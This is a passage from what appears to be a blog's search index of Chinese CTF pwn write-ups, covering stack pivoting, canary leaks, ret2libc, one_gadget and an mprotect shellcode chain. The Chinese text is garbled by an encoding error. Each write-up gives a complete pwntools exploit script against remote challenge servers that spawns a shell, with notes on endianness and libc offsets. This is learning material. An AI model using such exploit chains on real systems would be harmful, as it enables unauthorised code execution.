b&#x27;\\x00&#x27;))print(b&quot;puts===========&quot;+hex(puts).encode())libc=LibcSearcher(&quot;puts&quot;,puts)libc_base=puts-libc.dump(&quot;puts&quot;)print(b&quot;libc_base===========&quot;+hex(libc_base).encode())system=libc_base+libc.dump(&quot;system&quot;)bin=libc_base+libc.dump(&quot;str_bin_sh&quot;)print(b&quot;system===========&quot;+hex(system).encode())print(b&quot;bin===========&quot;+hex(bin).encode())payload=p64(ret)+p64(rdi)+p64(bin)+p64(ret)+p64(system)payload=payload.ljust(0x50,b&quot;\\x00&quot;)payload+= p64(bss+0x200)+p64(leave)p.send(payload)p.interactive() æ”¶è· è°ƒç”¨systemå‡½æ•°ä¼šå‹æ ˆï¼Œæ‰€ä»¥è¿™ä¸ªåœ°å€ä¹Ÿè¦æŠ¬é«˜ï¼Œç¡®ä¿å®ƒæ˜¯åœ¨rw-pæƒé™æ®µ åœ¨æ²¡æœ‰æŠ¬é«˜æ ˆåœ°å€çš„æ—¶å€™ æ­¤æ—¶æƒé™ä¸å¤Ÿ","categories":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/categories/pwn-study/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"æ ˆè¿ç§»","slug":"æ ˆè¿ç§»","permalink":"http://example.com/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/"}]},{"title":"[2021 é¹¤åŸæ¯]littleof","slug":"2021-é¹¤åŸæ¯-littleof","date":"2025-07-31T07:43:25.000Z","updated":"2025-09-03T10:57:20.415Z","comments":true,"path":"2025/07/31/2021-é¹¤åŸæ¯-littleof/","permalink":"http://example.com/2025/07/31/2021-%E9%B9%A4%E5%9F%8E%E6%9D%AF-littleof/","excerpt":"","text":"é¢˜ç›® å¼€å¯äº†canaryä¿æŠ¤ æ‰€ä»¥ç”¨printfæ³„éœ²canaryçš„æ•°å€¼ ä¹‹åç”¨ret2libcçš„æ–¹æ³•è§£å†³ è„šæœ¬12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *from LibcSearcher import *context.log_level = &#x27;debug&#x27;#p = process(&#x27;./littleof&#x27;)p = remote(&#x27;node4.anna.nssctf.cn&#x27;, 28230)elf = ELF(&quot;./littleof&quot;)# canaryæ³„éœ²payload1 = b&#x27;a&#x27; * (0x50 - 0x8) + b&#x27;b&#x27;p.recvuntil(b&#x27;Do you know how to do buffer overflow?\\n&#x27;)p.send(payload1)p.recvuntil(b&#x27;b&#x27;)canary = u64(p.recv(7).rjust(8, b&#x27;\\00&#x27;))print(f&quot;canary :&#123;hex(canary)&#125;&quot;)# ret2libcrdi = 0x400863ret = 0x40059eputs_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]main = 0x400789payload2 = b&#x27;a&#x27; *0x48 + p64(canary)payload2+= p64(0) + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)p.sendline(payload2)p.recvuntil(b&#x27;I hope you win\\n&#x27;)puts_addr = u64(p.recvuntil(b&#x27;\\n&#x27;)[:-1].ljust(8, b&#x27;\\00&#x27;))print(f&quot;puts_addr: &#123;hex(puts_addr)&#125;&quot;)libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)system_addr = libc_base + libc.dump(&#x27;system&#x27;)bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)#gdb.attach(p,&quot;b *0x0000000000400787&quot;)payload3 = b&#x27;a&#x27; * (0x50 - 0x8) + p64(canary) + p64(0)payload3+=p64(ret)+ p64(rdi) + p64(bin_sh) + p64(system_addr)p.sendline(payload3)p.interactive() 1canary = u64(p.recv(7).rjust(8, b&#x27;\\00&#x27;)) æ­¤æ—¶è¯»å–çš„è¿˜æ˜¯å°ç«¯åºã€‚æ‰€ä»¥åœ¨å·¦ä¾§è¡¥ä½\\x00 æ”¶è·canaryæ¥æ”¶å‡è®¾æˆ‘ä»¬ç°åœ¨è¦æ³„éœ²çš„ Canary å€¼æ˜¯ 0x1122334455667700ã€‚ æ­¥éª¤ä¸€ï¼šå†…å­˜ä¸­çš„åŸå§‹çŠ¶æ€ åœ¨ç¨‹åºè¿è¡Œçš„å†…å­˜ä¸­ï¼Œè¿™ä¸ª Canary å€¼ä»¥å°ç«¯åºå­˜å‚¨ã€‚è¿™æ„å‘³ç€å®ƒçš„å­—èŠ‚é¡ºåºæ˜¯åè¿‡æ¥çš„ã€‚ å†…å­˜åœ°å€ (ä½) -&gt; Canary å­—èŠ‚åº (é«˜) \\x00\\x77\\x66\\x55\\x44\\x33\\x22\\x11 ï¼ŒCanary çš„æœ€ä½å­—èŠ‚æ˜¯ \\x00ï¼Œå­˜å‚¨åœ¨æœ€ä½åœ°å€ã€‚ æ­¥éª¤äºŒï¼šæ„é€ å¹¶å‘é€ç¬¬ä¸€ä¸ª Payload (æ³„éœ²) æˆ‘ä»¬æ„é€  Payloadï¼šbâ€™aâ€™ * 0x48 + bâ€™bâ€™ã€‚ ç¨‹åºæ¥æ”¶åï¼Œç¼“å†²åŒºè¢«å¡«æ»¡ï¼Œbâ€™bâ€™ è¦†ç›–äº† Canary çš„æœ€ä½å­—èŠ‚ \\x00ã€‚ ç°åœ¨ï¼Œå†…å­˜ä¸­çš„ Canary å˜æˆäº†ï¼š \\x62\\x77\\x66\\x55\\x44\\x33\\x22\\x11ï¼Œ\\x62 æ˜¯å­—ç¬¦ â€˜bâ€™ çš„åå…­è¿›åˆ¶å€¼ã€‚ æ­¥éª¤ä¸‰ï¼šç¨‹åºè¾“å‡ºæ³„éœ²çš„æ•°æ® ç¨‹åºä½¿ç”¨ printf(â€œ%sâ€, buf) è¿™æ ·çš„æ–¹å¼å°†æ ˆä¸Šçš„æ•°æ®å½“æˆå­—ç¬¦ä¸²è¾“å‡ºã€‚å®ƒä¼šä» buf å¼€å§‹å‘åæ‰“å°ï¼Œç›´åˆ°é‡åˆ°ç¬¬ä¸€ä¸ªç©ºå­—èŠ‚ \\x00ã€‚ ç”±äºæˆ‘ä»¬ç”¨ b è¦†ç›–äº† Canary çš„æœ€ä½å­—èŠ‚ï¼Œprintf ä¸ä¼šåœ¨è¿™é‡Œåœæ­¢ï¼Œè€Œæ˜¯ç»§ç»­å‘åæ‰“å°ã€‚ å®ƒä¼šæ‰“å°å‡º b åŠ ä¸Š Canary å‰©ä¸‹çš„ 7 ä¸ªå­—èŠ‚ï¼š\\x62\\x77\\x66\\x55\\x44\\x33\\x22\\x11 æ­¥éª¤å››ï¼šè„šæœ¬æ¥æ”¶å¹¶å¤„ç†æ³„éœ²æ•°æ® æˆ‘ä»¬çš„ Python è„šæœ¬æ‰§è¡Œ p.recvuntil(bâ€™bâ€™)ï¼Œå…ˆæ¥æ”¶åˆ° bï¼Œç„¶åæ‰§è¡Œ p.recv(7)ï¼Œæ¥æ”¶å‰©ä¸‹çš„ 7 ä¸ªå­—èŠ‚\\x77\\x66\\x55\\x44\\x33\\x22\\x11 æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ç”¨ rjust(8, bâ€™\\x00â€™) æ¥æ¢å¤ Canaryï¼Œå°±canaryçš„å°ç«¯åºæƒ…å†µæ¥çœ‹ï¼Œåœ¨æ•°æ®å·¦ä¾§æ·»ä¸€ä¸ªâ€\\x00â€,æ‰€ä»¥è¦ç”¨rjustï¼ˆæŠŠç°æœ‰æ•°æ®æ”¾å³è¾¹ï¼‰ æœ€åï¼Œæˆ‘ä»¬ç”¨ u64() å°†è¿™ä¸ªå®Œæ•´çš„ 8 å­—èŠ‚å°ç«¯åºæ•°æ®è½¬æ¢å›ä¸€ä¸ªæ•´æ•°ï¼š canary &#x3D; u64(bâ€™\\x00\\x77\\x66\\x55\\x44\\x33\\x22\\x11â€™)ç»“æœå°±æ˜¯ï¼š0x1122334455667700 è‡³æ­¤ï¼ŒCanary æ³„éœ²å®Œæˆã€‚ å°ç«¯åº12leaked = p.recv(8) # æ”¶åˆ° 8 å­—èŠ‚ï¼šb&#x27;\\x00\\x12\\x34\\x56\\x78\\x9a\\xbc\\xde&#x27;value = u64(leaked) # â†’ 0xdebc9a7856341200 12target_addr = 0x401123p.send(p64(target_addr)) # â†’ å‘é€ b&#x27;\\x23\\x11\\x40\\x00\\x00\\x00\\x00\\x00&#x27; ä»å†…å­˜è¯»æ•´æ•°ï¼ˆcanaryã€åœ°å€ï¼‰ âœ… æ˜¯ ç”¨u32&#x2F;u64 å‘å†…å­˜å†™æ•´æ•°ï¼ˆROPã€æº¢å‡ºï¼‰ âœ… æ˜¯ ç”¨p32&#x2F;p64 å­—ç¬¦ä¸²ï¼ˆâ€helloâ€ï¼‰ âŒ å¦ æŒ‰æ­£å¸¸é¡ºåº ç½‘ç»œåè®® âŒ å¦ï¼ˆç”¨å¤§ç«¯ï¼‰ ç”¨&gt;I,&gt;Q æ–‡ä»¶æ ¼å¼ï¼ˆELFã€PNGï¼‰ âŒ å¦ æŒ‰å­—èŠ‚æµé¡ºåº æ ¼å¼åŒ–å­—ç¬¦ä¸²è¾“å‡ºï¼ˆ%pï¼‰ âŒ å¦ ç›´æ¥è½¬æ•´æ•° æ³„éœ²çš„ hex å­—ç¬¦ä¸²ï¼ˆå¦‚ â€œaabbccddâ€ï¼‰ âŒ å¦ å…ˆbytes.fromhex()å†çœ‹æ˜¯å¦è¦åè½¬","categories":[{"name":"exercise_pwn","slug":"exercise-pwn","permalink":"http://example.com/categories/exercise-pwn/"}],"tags":[{"name":"Canaryç»•è¿‡","slug":"Canaryç»•è¿‡","permalink":"http://example.com/tags/Canary%E7%BB%95%E8%BF%87/"},{"name":"å°ç«¯åº","slug":"å°ç«¯åº","permalink":"http://example.com/tags/%E5%B0%8F%E7%AB%AF%E5%BA%8F/"},{"name":"stack","slug":"stack","permalink":"http://example.com/tags/stack/"}]},{"title":"gyctf_2020_borrowstack","slug":"gyctf-2020-borrowstack","date":"2025-07-29T02:28:09.000Z","updated":"2025-09-03T10:56:04.264Z","comments":true,"path":"2025/07/29/gyctf-2020-borrowstack/","permalink":"http://example.com/2025/07/29/gyctf-2020-borrowstack/","excerpt":"","text":"é¢˜ç›® æ€è·¯ï¼š bankæ˜¯bssæ®µä¸Šçš„ï¼Œæ ˆç©ºé—´ä¸è¶³,æŠŠæ³„éœ²libcçš„ä¸œè¥¿æ”¾åœ¨bankä¸Šï¼Œé€šè¿‡bufè·³è½¬åˆ°bankæ³„éœ²libcå»æ‰¾åˆ°libcåŸºå€ ç„¶ååŠ ä¸Šå¯¹åº”libcçš„one_gadgetåç§»ï¼Œè·³è½¬è¿‡å»æ‰§è¡Œong_gadgatå°±å¯ä»¥äº† è„šæœ¬12345678910111213141516171819202122232425262728293031323334from pwn import *from LibcSearcher import *#p=process(&quot;./gyctf_2020_borrowstack&quot;)p=remote(&quot;node5.buuoj.cn&quot;,27049)elf=ELF(&quot;./gyctf_2020_borrowstack&quot;)bank=0x0000000000601080leave=0x400699rdi=0x0400703ret=0x4004c9puts_plt=elf.plt[&quot;puts&quot;]puts_got=elf.got[&quot;puts&quot;]main=0x400626payload1=b&#x27;a&#x27;*0x60+p64(bank)+p64(leave)p.recvuntil(b&quot;want&quot;)p.send(payload1)p.recvuntil(b&quot;now!&quot;)payload2=p64(ret)*20+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)p.send(payload2)a=p.recvline()puts= u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;))print(hex(puts))libc=LibcSearcher(&quot;puts&quot;,puts)libc_base=puts-libc.dump(&quot;puts&quot;)one=libc_base+0x4526apayload=b&#x27;a&#x27;*0x68+p64(one)p.sendline(payload)p.interactive() æ”¶è·p64(ret)*0x20åŸå› å½“ main å‡½æ•°å†æ¬¡è¢«æ‰§è¡Œæ—¶ï¼ˆå› ä¸ºä½ çš„ ROP é“¾æœ€åè·³è½¬åˆ°äº† main å‡½æ•°çš„åœ°å€ï¼‰ï¼š ç¨‹åºä¼šä¸ºæ–°çš„ main å‡½æ•°è°ƒç”¨é‡æ–°åˆ†é…ä¸€ä¸ªæ ˆå¸§ã€‚ åœ¨è¿™ä¸ªæ–°çš„æ ˆå¸§ä¸­ï¼Œä¼šå†æ¬¡ä¸ºå±€éƒ¨å˜é‡ buf[96] åˆ†é…ç©ºé—´ã€‚ ä¸ºä»€ä¹ˆâ€œä¸´æ—¶å˜é‡çš„ç©ºé—´ä¼šè¦†ç›–åˆ° GOT è¡¨â€ï¼Ÿ è¿™é‡Œå°±æ˜¯å…³é”®ç‚¹ã€‚åœ¨ 64 ä½ç¨‹åºä¸­ï¼Œæ ˆæ˜¯å‘ä¸‹å¢é•¿çš„ï¼ˆä»é«˜åœ°å€å‘ä½åœ°å€ï¼‰ã€‚ GOT è¡¨é€šå¸¸åœ¨ç¨‹åºçš„ä½åœ°å€åŒºåŸŸã€‚ ï¼ˆä¾‹å¦‚ï¼š0x0601018ï¼‰ bank å˜é‡åœ¨ .bss æ®µï¼Œé€šå¸¸åœ°å€æ¯” GOT è¡¨é«˜ã€‚ ï¼ˆä¾‹å¦‚ï¼š0x0601080ï¼‰ æ ˆä¼šå‘ä¸‹å¢é•¿ã€‚ å½“ main å‡½æ•°å†æ¬¡è¢«è°ƒç”¨ï¼Œå¹¶ä¸”å®ƒåœ¨å †æ ˆä¸Šåˆ†é… buf ç­‰å±€éƒ¨å˜é‡æ—¶ï¼Œè¿™äº›å˜é‡ä¼šå ç”¨ rsp å‘ä¸‹å¢é•¿çš„å†…å­˜ç©ºé—´ã€‚ ç°åœ¨æƒ³è±¡ä¸€ä¸‹ï¼š ä½ çš„æ ˆè¿ç§»ï¼ŒæŠŠ rsp è®¾ç½®åˆ°äº† bank å¤„ï¼ˆä¾‹å¦‚ 0x0601080ï¼‰ã€‚ ä½ ç”¨ p64(ret)*20 æŠŠä½ çš„ ROP é“¾æ¨åˆ°äº† bank + 160 (ä¾‹å¦‚ 0x0601120)ã€‚ ä½ çš„ ROP é“¾æ‰§è¡Œï¼Œæ³„æ¼ puts åœ°å€ã€‚ ç„¶åï¼Œä½ çš„ ROP é“¾æœ€åæ‰§è¡Œ p64(main)ï¼Œå¯¼è‡´ç¨‹åºè·³è½¬å› main å‡½æ•°çš„å¼€å¤´ã€‚ å½“ main å‡½æ•°å†æ¬¡æ‰§è¡Œæ—¶ï¼Œå®ƒä¼šåœ¨æ ˆä¸Šé‡æ–°åˆ†é…ç©ºé—´ã€‚ æ­¤æ—¶ï¼Œæ–°çš„æ ˆå¸§å¯èƒ½ä¼šä» rsp çš„å½“å‰ä½ç½®ï¼ˆå³ 0x0601120ï¼Œä¹Ÿå°±æ˜¯ä½ çš„ ROP é“¾æœ€åæ‰§è¡Œå®Œçš„ä½ç½®ï¼‰å¼€å§‹å‘ä¸‹ï¼ˆå‘ä½åœ°å€ï¼‰å¢é•¿ã€‚ å¦‚æœ main å‡½æ•°åˆ†é…çš„å±€éƒ¨å˜é‡ï¼ˆä¾‹å¦‚ buf[96]ï¼‰çš„æ–°ç©ºé—´ï¼Œåœ¨æ ˆå‘ä¸‹å¢é•¿çš„è¿‡ç¨‹ä¸­ï¼Œæ°å¥½â€œè¦†ç›–â€åˆ°äº† GOT è¡¨æ‰€åœ¨çš„å†…å­˜åŒºåŸŸï¼ˆä¾‹å¦‚ 0x0601018ï¼‰ï¼Œé‚£ä¹ˆ GOT è¡¨çš„åœ°å€å°±ä¼šè¢«è¿™äº›å±€éƒ¨å˜é‡çš„åƒåœ¾æ•°æ®æ‰€ç ´åã€‚ p64(ret)*20 çš„ä½œç”¨ æ‰€ä»¥ï¼Œp64(ret)*20 åœ¨è¿™é‡Œçš„å¦ä¸€ä¸ªé‡è¦ä½œç”¨å°±æ˜¯ï¼š å®ƒå°†ä½ çš„ä¼ªé€ æ ˆå¸§ï¼ˆå³ä½ å†™å…¥ bank çš„ ROP é“¾ï¼‰å‘é«˜åœ°å€æ–¹å‘æ¨å¾—æ›´è¿œã€‚ è¿™æ ·ï¼Œå½“ main å‡½æ•°å†æ¬¡è¢«è°ƒç”¨æ—¶ï¼Œå®ƒä¼šä»ä½ ä¼ªé€ æ ˆçš„æœ«å°¾ï¼ˆbank + 160 + ROP é“¾é•¿åº¦ï¼‰å¼€å§‹å‘ä¸‹åˆ†é…æ–°çš„æ ˆå¸§ã€‚ é€šè¿‡æŠŠä½ çš„ä¼ªé€ æ ˆï¼ˆå’Œ rsp çš„ä½ç½®ï¼‰è®¾ç½®åœ¨è¶³å¤Ÿé«˜çš„åœ°å€ï¼Œå¯ä»¥ç¡®ä¿ main å‡½æ•°å†æ¬¡åˆ†é…çš„å±€éƒ¨å˜é‡ç©ºé—´ï¼ˆæ ˆå‘ä¸‹å¢é•¿çš„éƒ¨åˆ†ï¼‰ä¸ä¼šä¾µçŠ¯åˆ°ä½äºä½åœ°å€çš„ GOT è¡¨ã€‚ ç”¨å›¾ç¤ºæ¥è¯´æ˜ï¼š æ²¡æœ‰ p64(ret)\\*20 çš„é£é™©ï¼š 1234567891011121314é«˜åœ°å€...0x0601080 &lt;-- bank (rsp è¿ç§»åˆ°è¿™é‡Œ)| pop_rdi || puts_got| &lt;-- ROPé“¾| puts_plt|| main |...0x0601018 &lt;-- puts_got (GOTè¡¨)...ä½åœ°å€å½“ main å†æ¬¡è¿è¡Œï¼Œå®ƒå¯èƒ½ä» 0x0601080 é™„è¿‘å‘ä¸‹åˆ†é…æ–°çš„ buf ç©ºé—´ï¼Œè¿™ä¸ª buf ç©ºé—´å¯èƒ½ç›´æ¥è¦†ç›–åˆ° 0x0601018 å¤„çš„ puts_gotã€‚ æœ‰äº† p64(ret)\\*20 çš„å¥½å¤„ï¼š 1234567891011121314151617181920é«˜åœ°å€...0x0601120 &lt;-- bank + 160 (rsp æœ€ç»ˆä¼šåˆ°è¿™é‡Œ)| pop_rdi || puts_got| &lt;-- ROPé“¾| puts_plt|| main |...0x0601080 &lt;-- bank (rsp æœ€åˆè¿ç§»åˆ°è¿™é‡Œï¼Œp64(ret)*20 å¡«å……)| ret || ... || ret |...0x0601018 &lt;-- puts_got (GOTè¡¨)...ä½åœ°å€å½“ main å†æ¬¡è¿è¡Œï¼Œå®ƒä¼šä» 0x0601120 é™„è¿‘å‘ä¸‹åˆ†é…æ–°çš„ buf ç©ºé—´ã€‚ç”±äº 0x0601120 è¶³å¤Ÿé«˜ï¼Œå‘ä¸‹åˆ†é…çš„ buf ç©ºé—´ä¸ä¼šåˆ°è¾¾ 0x0601018 çš„ puts_gotã€‚GOTè¡¨å› æ­¤è¢«ä¿æŠ¤äº†ã€‚ æ‰€ä»¥ï¼Œè¿™æ®µè§£é‡ŠæŒ‡çš„æ˜¯ï¼šp64(ret)\\*20 èƒ½å¤Ÿå°†ä½ çš„ ROP é“¾çš„â€œèµ·ç‚¹â€æŠ¬é«˜ï¼Œä»è€Œé¿å…å½“ç¨‹åºå†æ¬¡å›åˆ° main å‡½æ•°å¹¶é‡æ–°åˆ†é…æ ˆç©ºé—´æ—¶ï¼Œmain å‡½æ•°çš„å±€éƒ¨å˜é‡ï¼ˆå¦‚ bufï¼‰åœ¨æ ˆå‘ä¸‹å¢é•¿æ—¶ï¼Œå…¶ç©ºé—´ä¸ GOT è¡¨å‘ç”Ÿé‡å ï¼Œè¿›è€Œç ´å GOT è¡¨ã€‚ è¿™æ˜¯ä¸€ç§éå¸¸å¸¸è§çš„ï¼Œä¹Ÿæ˜¯éå¸¸é‡è¦çš„é˜²å¾¡æ€§ç­–ç•¥ï¼Œç¡®ä¿äº†åç»­æ”»å‡»ï¼ˆä¾‹å¦‚è·å– Shellï¼‰çš„å¯é æ€§ï¼Œå› ä¸ºè¿™äº›æ”»å‡»é€šå¸¸éœ€è¦ä¸€ä¸ªå®Œå¥½æ— æŸçš„ GOT è¡¨æ¥è§£æå‡½æ•°åœ°å€ã€‚ å¤§å°1.å¯ä»¥ä»ä¸€ä¸ªå°æ•°å¼€å§‹å°è¯•ï¼ˆæ¨èï¼‰ ä¸€èˆ¬æƒ…å†µä¸‹20å°±å¤Ÿäº† ä¸èƒ½å¤ªå¤§ï¼Œ read(0, &amp;bank, 0x100uLL) å†™å…¥çš„ã€‚è¿™ä¸ª read å‡½æ•°æœ€å¤šåªèƒ½è¯»å– 0x100 (256) å­—èŠ‚ã€‚ ä½ çš„ payload é•¿åº¦æ˜¯æœ‰é™åˆ¶çš„ã€‚ p64(ret)*N å æ®çš„å­—èŠ‚æ•°æ˜¯ N * 8ã€‚ ä½ çš„æ ¸å¿ƒ ROP é“¾ (p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)) æœ¬èº«ä¹Ÿéœ€è¦ç©ºé—´ã€‚ p64(pop_rdi): 8 å­—èŠ‚ p64(puts_got): 8 å­—èŠ‚ p64(puts_plt): 8 å­—èŠ‚ p64(main): 8 å­—èŠ‚ æ ¸å¿ƒ ROP é“¾å…± 4 * 8 = 32 å­—èŠ‚ã€‚ å¦‚æœ N è¿‡å¤§ï¼Œä¾‹å¦‚ N=100ï¼Œé‚£ä¹ˆ p64(ret)*100 å°±éœ€è¦ 100 * 8 = 800 å­—èŠ‚ã€‚è¿™å·²ç»è¿œè¿œè¶…è¿‡äº† read å‡½æ•°èƒ½è¯»å–çš„æœ€å¤§ 0x100 (256) å­—èŠ‚ã€‚ one_gadgetå’ŒLibcSearcherone_gadget æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå®ƒç”¨äºåˆ†æ libc åº“æ–‡ä»¶ï¼Œå¹¶æ‰¾åˆ°å…¶ä¸­å¯ä»¥ç›´æ¥ç”¨äºè·å– shell çš„æŒ‡ä»¤åºåˆ—çš„åç§»é‡ã€‚ ä¸ä¼ ç»Ÿçš„ system(&quot;/bin/sh&quot;) æ–¹æ³•ç›¸æ¯”ï¼Œone_gadget é€šå¸¸æ›´ç®€æ´ï¼Œå› ä¸ºå®ƒåªéœ€è¦ä¸€ä¸ªåœ°å€å°±èƒ½è·å– shellï¼Œè€Œä¸éœ€è¦ pop_rdi gadgetã€&quot;/bin/sh&quot; å­—ç¬¦ä¸²çš„åœ°å€å’Œ system å‡½æ•°çš„åœ°å€ã€‚ æ­¤å¤–ï¼Œone_gadget é€šå¸¸å¯¹ç¯å¢ƒï¼ˆåŒ…æ‹¬æ ˆå¯¹é½ï¼‰çš„è¦æ±‚æ›´å®½æ¾ã€‚ ç”¨æ³•å’Œshellcodeä¸€æ · æ‰¾åˆ°ä½ç½®å³å¯ibc æŠŠæ³„éœ²å‡ºæ¥çš„å‡½æ•°åœ°å€åœ¨libcç½‘ç«™åŒ¹é… ä¹‹åä¸‹è½½åŒ¹é…çš„çš„libcç‰ˆæœ¬ ç”¨å‘½ä»¤ 1one_gadget /home/p0ach1l/Documents/libc6_2.23-0ubuntu11_amd64.so æ‰¾åˆ°åˆé€‚çš„åç§»é‡å³å¯ï¼ˆåœ°å€ä¸‹é¢æ˜¯å®ƒè¦æ»¡è¶³çš„æ¡ä»¶ï¼‰ LibcSearcher åŒ¹é…çš„ç‰ˆæœ¬æ˜¯å®ƒè‡ªå·±æ•°æ®åº“ä¸­çš„ç‰ˆæœ¬ï¼Œè€Œä¸æ˜¯ä½ æœ¬åœ°è®¡ç®—æœºä¸Š /lib/x86_64-linux-gnu/libc.so.6 è¿™æ ·çš„æ–‡ä»¶ã€‚ 123system=libc_base+libc.dump(&#x27;system&#x27;)binsh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload=b&#x27;a&#x27;*(0x60+8)+p64(pop_rdi)+p64(binsh)+p64(system) æ˜¯ç”¨å®ƒLibcSearcheråŒ¹é…çš„ç‰ˆæœ¬ï¼Œè€Œone_gadgetæ˜¯ç”¨æˆ‘ä»¬åŒ¹é…ä¸‹è½½çš„libcæ–‡ä»¶å»å®é™…è®¡ç®—çš„ï¼Œæ›´å‡†ç¡® system(&quot;/bin/sh&quot;) çš„å¤±è´¥ï¼š system(&quot;/bin/sh&quot;) æ–¹æ³•éœ€è¦è®¡ç®— system å‡½æ•°çš„åœ°å€ (libc_base + libc.dump(&#39;system&#39;)) å’Œ &quot;/bin/sh&quot; å­—ç¬¦ä¸²çš„åœ°å€ (libc_base + libc.dump(&#39;str_bin_sh&#39;))ã€‚ å¦‚æœè¿™ç§æ–¹æ³•å¤±è´¥ï¼Œæœ€æ ¸å¿ƒçš„åŸå› æ˜¯ LibcSearcher ä¸ºä½ é€‰å®šçš„é‚£ä¸ª libc ç‰ˆæœ¬ï¼ˆä¾‹å¦‚ libc6_2.23-0ubuntu10_amd64ï¼‰ï¼Œè™½ç„¶å…¶ puts åç§»å’Œ one_gadget çš„ç‰¹å®šåç§»ä¸è¿œç¨‹æœåŠ¡å™¨ç›¸ç¬¦ï¼Œä½†å…¶å†…éƒ¨è®°å½•çš„ system å‡½æ•°å’Œ &quot;/bin/sh&quot; å­—ç¬¦ä¸²çš„ç›¸å¯¹åç§»é‡ï¼Œä¸è¿œç¨‹æœåŠ¡å™¨å®é™… libc ä¸­çš„è¿™ä¸¤ä¸ªåç§»é‡ä¸ä¸€è‡´**ã€‚ libc ç‰ˆæœ¬å·ï¼ˆå¦‚ 2.23ï¼‰å¯èƒ½ç›¸åŒï¼Œä½†ä¸åŒçš„å‘è¡Œç‰ˆæˆ–ç¼–è¯‘é€‰é¡¹ï¼ˆå¦‚ ubuntu10 vs ubuntu11ï¼Œæˆ–ä¸åŒçš„æ„å»ºæ—¥æœŸï¼‰ä¼šå¯¼è‡´å†…éƒ¨å‡½æ•°å’Œå­—ç¬¦ä¸²çš„å…·ä½“ç›¸å¯¹ä½ç½®å­˜åœ¨ç»†å¾®å·®å¼‚ã€‚å³ä½¿ puts å’ŒæŸä¸ª one_gadget çš„åç§»æ°å¥½ç›¸åŒï¼Œsystem æˆ– &quot;/bin/sh&quot; çš„åç§»å¯èƒ½å°±ä¸åŒäº†ã€‚ å½“ä½ ç”¨é”™è¯¯çš„åç§»é‡è®¡ç®—å‡º system å’Œ &quot;/bin/sh&quot; çš„åœ°å€å¹¶å°è¯•è·³è½¬æ—¶ï¼Œç¨‹åºä¼šå› ä¸º RIP æŒ‡å‘æ— æ•ˆåœ°å€æˆ– system å‡½æ•°æ¥æ”¶åˆ°æ— æ•ˆå‚æ•°è€Œå´©æºƒï¼ˆdumped coreï¼‰ã€‚","categories":[{"name":"exercise_pwn","slug":"exercise-pwn","permalink":"http://example.com/categories/exercise-pwn/"}],"tags":[{"name":"one_gadget","slug":"one-gadget","permalink":"http://example.com/tags/one-gadget/"},{"name":"æ ˆè¿ç§»","slug":"æ ˆè¿ç§»","permalink":"http://example.com/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/"},{"name":"stack","slug":"stack","permalink":"http://example.com/tags/stack/"}]},{"title":"pwn49","slug":"pwn49","date":"2025-07-26T08:00:42.000Z","updated":"2025-09-03T10:56:46.250Z","comments":true,"path":"2025/07/26/pwn49/","permalink":"http://example.com/2025/07/26/pwn49/","excerpt":"","text":"é¢˜ç›® çœ‹å‡ºæ˜¯é™æ€ç¼–è¯‘ï¼Œè€ƒè™‘ç”¨mprotectæ¥ä¿®æ”¹å®ƒçš„æƒé™ ctrl+sæŸ¥çœ‹bssæ®µï¼Œæ‰¾è¦ä¿®æ”¹çš„èŒƒå›´ å› ä¸ºmprotectçš„åœ°å€é€‰æ‹©çš„é™åˆ¶æ¡ä»¶ æˆ‘ä»¬æŠŠé¡µé¢è¾¹ç•Œå®šä¸º0x80DA000 æ¥ç€å°±å¯ä»¥æ„é€ payloadäº† å…ˆè°ƒç”¨mprotectå‡½æ•°ä¿®æ”¹æƒé™ï¼Œå†ç”¨readå‡½æ•°æŠŠåé—¨å‡½æ•°è¯»å…¥è¿™ä¸ªä½ç½® ä¹‹åæ§åˆ¶è¿”å›åœ°å€è®©ç¨‹åºå›åˆ°è¿™ä¸ªåœ°æ–¹æ‰§è¡Œåé—¨å‡½æ•° è„šæœ¬12345678910111213141516171819from pwn import *#p=process(&quot;./pwn49&quot;)context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)#gdb.attach(p,&quot;b*0x0000000000400737&quot;)p=remote( &quot;pwn.challenge.ctf.show&quot;,28242)elf=ELF(&quot;./pwn49&quot;)edx_ecx_ebx=0x08056194mprotect=0x0806cdd0start=0x80DA000read=elf.sym[&quot;read&quot;]payload=b&#x27;a&#x27;*(0x12+4)+p32(mprotect)payload += p32(edx_ecx_ebx) + p32(start) + p32(1000) + p32(7)payload+=p32(read)+p32(edx_ecx_ebx)+p32(0)+p32(start)+p32(1000)+p32(start)p.sendline(payload)payload=asm(shellcraft.sh())p.sendline(payload)p.interactive() ï¼ˆæ‰¾pop_retæ—¶åªéœ€è¦æ§åˆ¶æ˜¯popäº†é‚£ä¸‰ä¸ªå¯„å­˜å™¨å°±å¯ä»¥ï¼‰ mprotect mprotect ç³»ç»Ÿè°ƒç”¨æœ‰ä¸¥æ ¼çš„é¡µé¢å¯¹é½è¦æ±‚ï¼š èµ·å§‹åœ°å€å¿…é¡»æ˜¯é¡µé¢è¾¹ç•Œï¼ˆ4KBä¸ªå­—èŠ‚çš„å€æ•°ï¼‰ï¼ˆ4KB&#x3D;1000å­—èŠ‚) é•¿åº¦ä¼šè¢«å‘ä¸Šèˆå…¥åˆ°é¡µé¢è¾¹ç•Œ åŒºé—´é•¿åº¦ len å¿…é¡»æ˜¯é¡µå¤§å°çš„æ•´æ•°å€ å‡è®¾ä½ çš„ BSS æ®µå¼€å§‹äº 0x80DB320,lené•¿åº¦ä¸º1000ï¼š å†…å­˜å¸ƒå±€ï¼š 1234567891011121314150x80DA000 